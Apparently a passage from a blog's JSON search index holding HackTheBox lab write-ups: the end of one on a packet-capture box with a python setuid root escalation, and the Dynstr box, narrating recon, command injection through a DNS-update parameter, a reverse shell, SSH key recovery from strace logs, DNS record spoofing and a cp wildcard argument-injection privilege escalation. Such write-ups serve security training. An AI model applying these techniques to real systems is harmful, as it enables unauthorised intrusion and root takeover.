tcpdump;My first attempt to inject code into the app.py file above does not work for some reasons.Looking at the code file permissions, I noticed it those not have any special permissions, but manages to execute tcpdump and capture packets, which is clearly a privileged operation. The call to python3 highlighted above is also direct with no special permissions, which indicate privileges are acquired by the call to os.setuid(0). So I opened a python3 shell as nathan, and execute the os.setuid(0) command, which gave me root privileges that I used to spawn a bash shell;Summary  Identified running services with NMAP, and web technologies with Wappalyzer.  Found an option on the web app for starting a 5 second packet capture, and downloading the PCAP file generated.  Found a DoS exploit for VSFPD service running on the host.  Mistook an established SSH connection shown in the Network Status menu as a connected FTP session. Got the idea to use the DoS exploit in the hope that the client will be disconnected, and authentication traffic captured during reconnection. It failed horribly, with the FTP server rejecting connections from my IP.  Discovered a PCAP file with captured FTP authentication traffic by bruteforcing the numeric identifier in the PCAP download URL. The PCAP contains FTP login credentials for a user named nathan, which gave me access to the system via SSH.  In  the system as the user nathan via SSH;          Found the source code file of the python3 script that performs the packet capture requested through the web application.      It uses tcpdump to capture packet after a call to os.setuid(0) to obtain privileges.      Launching the python CLI shell and calling the os.setuid(0) method granted me root privileges, indicating the python3 binary likely has SUID bit enabled.      "
  },
  
  {
    "title": "Dynstr - HackTheBox",
    "url": "/posts/hackthebox/dynstr.html",
    "categories": "hackthebox",
    "tags": "linux, web, dns, command injection, static analysis, nsupdate, custom exploitation",
    "date": "2021-10-20 00:00:00 +0100",
    
    "snippet": "Dynstr, a cool medium-rated linux box that’s all about DNS (as you probably guessed from the name). It features a web service that allows you to update DNS records on the server. One of the parameters in the request used to update DNS records is vulnerable to command injection, which I exploited to gain code execution on the box.Inside the box www-data, 2 local users were identified (dyna and bindmgr). Some log files generated by the script utility were obtained in the home directory of bindmgr. Going through the log files, I was able to recover an SSH private key for the user bindmgr, but couldn’t get access as the SSH key is mapped to a specific hostname. After bypassing this, I got access to the box as bindmgr over SSH, and exploited a custom script to gain code execution as root.InfoReconNMAP# Nmap 7.70 scan initiated Tue Oct  5 10:33:02 2021 as: nmap -sC -sV -v -oN namp.txt 10.10.10.244Increasing send delay for 10.10.10.244 from 0 to 5 due to 14 out of 46 dropped probes since last increase.Increasing send delay for 10.10.10.244 from 5 to 10 due to 13 out of 43 dropped probes since last increase.Increasing send delay for 10.10.10.244 from 320 to 640 due to 22 out of 73 dropped probes since last increase.Nmap scan report for dynstr.htb (10.10.10.244)Host is up (0.28s latency).Not shown: 997 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)| dns-nsid: |_  bind.version: 9.16.1-Ubuntu80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))| http-methods: |_  Supported Methods: POST OPTIONS HEAD GET|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Dyna DNSService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Oct  5 10:35:42 2021 -- 1 IP address (1 host up) scanned in 160.32 secondsWebWeb technologies detected by Wappalyzer;Found a credential in the  homepage dynadns:sndanyd, and an email address dns@dyna.htb;Testing the credential on SSH didn’t work, and all of the domains listed above point to the same page.Running gobuster in vhost enumeration didn’t yield anything. Directory enumeration yield one hit;The path has no index file nor directory listing. Bruteforcing with ffuf discovered another directory;It appears to be a special path as it handles requests for non-existing paths/files;This is strange to me so I decided to do some google-fu, and found this at https://www.dynu.com/en-US/Forum/ViewTopic/badauth-being-received/439;Turns out the URL is used to assign a domain name to an IP address in the DNS server.Using the above info, I crafted a request for the page using the credentials I obtained from the homepage for the user dynadns;Sending the request, I got a new response;I’m gessing the server is not allowing me to modify the root domain. So with the 3 domains found in the home page of the http://dynstr.htb, I was able to change the DNS records of their subdomains;I started listeners using netcat in both TCP and UDP modes, but didn’t get any requests. So I setup a wildcard rule *.dnsalias.htb to match all subdomains, which works, but I still didn’t get any callbacks;After resuming testing the next day, I discovered something weird: DNS updates are returning a different IP in response. The IP included in the request was the IP I was assigned the last time I connected to the HTB VPN, and the IP in the response is my current IP;Going through my previous notes, I realised I made a mistake; I have been passing the IP to map to domain name using the ip GET parameter, instead of myip. Changing the parameter worked.Running out of things to do, I started to fuzz the parameters submitted for the DNS update for injection-related vulnerabilities, and was able to get a new response;A quick check on my debian host showed nsupdate is a command line utility for DNS update;I suspect the web app is passing the hostname GET parameter without proper validation to a system call to nsupdate. If exploitable, this will give me a foothold into the server.FootholdAfter discovering a possible command injection flaw in the hostname GET parameter passed to http://dynstr.htb/nic/update, I tried to gain code execution by joining commands using linux ;, &amp;amp;&amp;amp;, and || operators. None of them worked. The web app also seems to be checking if the submitted hostname ends with a valid domain, in this case either dnsalias.htb, no-ip.htb, and dynamicdns.htb.After further testing, I was able to execute code by wrapping it in backtick characters. I got a response after 5 seconds due to the sleep 5 command;Although the above command worked, multiple simple commands to communicate with my attack host kept failing. Using the ping command for example, I noticed a delay in response that is appropriate with the number of packets sent when pinging localhost. However, attempts to ping my own host returned a response immediately saying; 911 [wrngdom: 10.14.45`www.dnsalias.htb]This make me suspicious of some kind of filter used by the web app, so I tried to base64-encode the commands. Using the base64 command-line program, I encoded a curl command to my attack host and sent it to the web app. It worked!I then used the above described method to spawn a bash reverse shell;UserInside the box as the default www-data user, I found 2 users named dyna and bindmgr. The home directory of dyna is empty, but that of bindmgr contains some files, including user flag that is not readable to us;So I downloaded all the files to my attack host for analysis.The file command-output-C62796521.txt showed the output of a failed public key authentication to an sftp service;The file strace-C62796521.txt showed the output of strace command. This is interesting because strace is used to trace all system calls made by a program.The file C62796521-debugging.timing contains some numbers;While the file C62796521-debugging.script contains terminal logs that are likely generated using the script command;This is also a very interesting file for me as the console log generated by script is very neat and will be easier to analyse. Going through the file, I noticed multiple outputs of strace. Towards the end of the file, the user bindmgr attempted a public key SSH authentication. Since strace was executed during the authentication, it captured the system call used by the SSH client to load the SSH private key of the user bindmgr from disk;I extracted the key to id_rsa on my attack host and tried to access the user account of bindmgr, but I got a prompt for password despite passing the private key. Enabling verbose output showed that the public key authentication failed.I used scriptreplay and gave it the timing file and the typescript to make sense of what the user was actually doing. It showed the user bindmgr attempting to download a file from an SSH server using sFTP;Looking at the authorized_keys file in bindmgr’s SSH directory, I noticed that access is allowed only to hosts with the name *.infra.dyna.htb;This means I need to map my IP to match the above hostname. Using the nsupdate utility and the keys inside /etc/bin, I was able to gain SSH access after lots of googling about nsupdate;PrivEscUser can run a script as root using sudo;The script checks for the file .version in the current working directory. If it does not exist, it aborts. If it does, it compares it’s value against the .version file in /etc/bind/named.bindmgr. If the value in the first .version file is higher, it copies the version file and any other file in the working directory to /etc/bind/named.bindmgr;I noticed the call to cp uses relative path. So I tried to gain root by tampering with the $PATH variable to execute a cp script of my own, which failed;Since the copy operation is done as root, and all files are included using a wildcard *, I was able to gain root by copying the bash binary and giving it the SUID permission, then have the permission retained after the copy operation by creating a file with the name --preserve=mode, which the cp command will interpret as a special argument;Summary  Found a DNS, SSH, and web service running on the host using nmap  Found a credential on the homepage of the web service with username dynadns and password sndanyd  Discovered /nic/update by bruteforcing with ffuf and gobuster. Requesting the path showed badauth, but passing the credentials discovered previously gives a nochg &amp;lt;user-IP&amp;gt; response.  Some googling showed that /nic/update is used to update DNS records, and takes the parameters hostname, myip, and location. The parameter hostname was found to be vulnerable to command injection through fuzzing after a response mentioning nsupdate, which is a command-line tool for updating DNS records, was returned. Base64-encoding allows for more complex commands to be injected. This was exploited to gain a foothold into the box as the web user www-data.  Inside the box as www-data;          Two users, binmgr, and dyna, were discovered. The home directory of dyna is practically empty, while that of bindmgr contains the user flag which is not readable, and some interesting files.      The files obtained from the home of bindmgr include console logs generated by the linux script utility. The user attempted an SSH public key authentication while running strace, which prints out lots of data on all system calls, which include the contents of the user’s private key as it was read from disk.      Attempts to access the account bindmgr using the extracted SSH private key failed. Checking /home/bindmgr/.ssh/authorized_keys showed that access is limited to hosts that match *.infra.dyna.htb. Using the key file at /etc/bind/infra.key and the nsupdate tool, I mapped my IP to hacker.infra.dyna.htb, which satisfied the SSH requirement, and gave me access to the bindmgr account, and the user flag.        Inside the box as bindmgr;          The user has permission to run /usr/local/bin/bindmgr.sh using sudo.      Attempt to hijack the relative call to cp made by the script through path tampering failed.      Since a wildcard * was used in the cp command to copy all files, creating a SUID bash binary, and an empty file named --preserve=mode, which will be matched by the wildcard, and be interpreted by the cp command as a special argument used to preserve permissions during copy operations, resulted in the copied binary being created with the ownership changed to root but the SUID bits retained, which gave me root access to the box.      "
  }
  
]
